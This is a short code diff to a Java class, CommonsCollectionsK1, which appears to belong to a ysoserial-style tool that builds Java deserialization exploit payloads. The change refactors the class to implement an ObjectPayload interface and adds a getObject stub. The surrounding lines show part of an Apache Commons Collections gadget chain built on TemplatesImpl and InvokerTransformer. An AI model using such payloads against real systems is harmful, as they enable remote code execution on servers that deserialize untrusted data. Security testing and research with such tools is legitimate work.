@@ -12,9 +12,9 @@ import java.io.ObjectOutputStream;
 import java.util.HashMap;
 import java.util.Map;
 
-public class CommonsCollectionsK1 {
+public class CommonsCollectionsK1 implements ObjectPayload<Object>{
 
-    public static byte[] getBytes(PayloadType type, String... param) throws Exception {
+    public byte[] getBytes(PayloadType type, String... param) throws Exception {
         Object tpl = Gadgets.createTemplatesImpl(type, param);
 
         InvokerTransformer      transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
@@ -36,5 +36,10 @@ public class CommonsCollectionsK1 {
         oos.close();
 
         return bytes;
+    }
+
+    @Override
+    public Object getObject(String command) throws Exception {
+        return null;
     }
 }
